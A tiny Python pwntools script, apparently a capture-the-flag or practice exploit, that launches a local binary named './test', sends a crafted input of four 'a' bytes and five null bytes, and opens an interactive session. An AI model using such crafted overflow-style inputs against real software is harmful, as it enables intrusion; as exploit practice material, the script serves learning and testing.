from pwn import *
p = process("./test")
p.sendline("a" * 4 + "\x00" * 5)
p.interactive()
